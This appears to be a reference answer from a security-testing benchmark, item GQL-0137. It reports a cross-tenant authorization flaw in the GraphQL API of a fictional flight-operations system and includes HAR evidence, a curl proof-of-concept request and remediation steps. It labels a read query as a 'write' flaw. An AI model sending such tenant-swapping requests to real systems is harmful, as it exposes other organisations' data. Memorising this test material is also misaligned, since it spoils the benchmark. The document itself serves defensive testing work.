# Expected Response

## System
- Domain: Aviation / Flight Ops
- System: AeroOps Flight Management
- Example ID: GQL-0137

## Priority Findings

### Finding 1: Aviation Flight Ops — Write Access BOLA Exposes Cross-Tenant Flight Data (Pattern 1.6)
**Severity:** Critical
**Category:** BOLA / Write Operations Without Ownership Check

**Summary:**
Per §5.0 (Pattern 1.6 — write operations without ownership check): The `listResources` resolver accepts a client-supplied `tenantId` filter, enabling cross-tenant flight data access without write ownership verification. An attacker from `tenant-46d3` passed `tenantId: "tenant-f020"` to `listResources` and received flight management data belonging to `tenant-f020`, including `CONFIDENTIAL-46d3f020`. In Aviation / Flight Ops, unauthorized access to flight operations data exposes flight plans, crew assignments, and safety-critical NOTAM information.

**Evidence from HAR:**
- Request: `POST https://api.aeroops-flight-manag.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-46d3`
- Query: `listResources(tenantId: "tenant-f020") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-f020"`, `ownerId: "other-user-46d3f020"`, `sensitiveField: "CONFIDENTIAL-46d3f020"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-46d3f020`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.6 | Write BOLA, listResources accepts tenantId |
| HAR request | tenantId argument | tenant-f020 (victim, client-supplied) |
| HAR response | tenantId | tenant-f020 flight data returned |
| HAR response | sensitiveField | CONFIDENTIAL-46d3f020 |

## Steps to Reproduce

### Step 1 — listResources with cross-tenant filter (HAR)
```bash
curl -s -X POST https://api.aeroops-flight-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-46d3" \
  -d '{"query": "query { listResources(tenantId: \"tenant-f020\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-f020` flight data returned. **Secure:** Only `tenant-46d3` data or FORBIDDEN.

## Remediation
1. Remove `tenantId` arg from `listResources`; derive from `$jwt.tenantId` only.
2. Resolver: `WHERE tenant_id = $jwt.tenantId`.
3. Strip `ownerId` from write operation inputs.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
